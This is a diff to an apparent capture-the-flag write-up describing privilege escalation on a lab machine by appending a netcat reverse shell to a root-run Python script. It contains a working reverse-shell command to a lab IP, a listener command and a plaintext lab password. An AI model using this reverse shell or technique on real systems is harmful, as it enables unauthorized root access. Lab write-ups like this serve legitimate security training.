@@ -121,22 +121,26 @@ pass: P@55W0rd1!2@
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cc163b76-6979-4950-a22d-234e76fbe523)
 
-+ Check processess:
++ Check processess, and see `python /opt/tmp.py` is being run every three minutes.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b73f6b8a-3828-497b-9e9c-c6a78793aaad)
 
-
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dbbe8171-9b71-4205-89f5-7fccd2d3482c)
 
++ Cat the script.
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5b3389db-2be5-499a-afba-1cdade55565b)
 
++ Add a reverse shell to the file:
+```
+echo "os.system('/bin/nc -e /bin/bash 10.10.14.10 4444')" >> tmp.py
+```
 
++ Start listener: `nc -lnvp 4444`
 
++ Get the root shell.
 
-
-
-
-
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bf72433f-2a2e-4170-a00d-6828eb6c7ba3)
 
 
 # References & Alternatives:
